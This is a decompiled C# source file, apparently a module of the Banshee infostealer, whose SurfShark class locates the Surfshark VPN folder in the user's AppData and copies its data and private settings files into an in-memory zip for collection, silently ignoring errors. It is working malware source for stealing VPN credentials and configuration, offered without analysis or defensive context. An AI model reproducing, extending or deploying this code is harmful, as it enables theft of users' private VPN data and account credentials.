﻿using System;
using System.IO;
using Banshee.Helper.Data;

namespace Banshee.Targets.Vpn
{
	// Token: 0x02000038 RID: 56
	public class SurfShark : ITarget
	{
		// Token: 0x06000075 RID: 117 RVA: 0x000048A8 File Offset: 0x000048A8
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Surfshark");
			if (!Directory.Exists(text))
			{
				return;
			}
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "Surfshark";
			string text2 = ZipPath.Vpn("Surfshark");
			foreach (string path in new string[]
			{
				"data.dat",
				"settings.dat",
				"settings-log.dat",
				"private_settings.dat"
			})
			{
				try
				{
					string path2 = Path.Combine(text, path);
					if (File.Exists(path2))
					{
						zip.AddFile(Path.Combine(text2, path), File.ReadAllBytes(path2));
					}
				}
				catch
				{
				}
			}
			counterApplications.Files.Add(text + " => " + text2);
			counterApplications.Files.Add(text2 + "\\");
			counter.Vpns.Add(counterApplications);
		}
	}
}
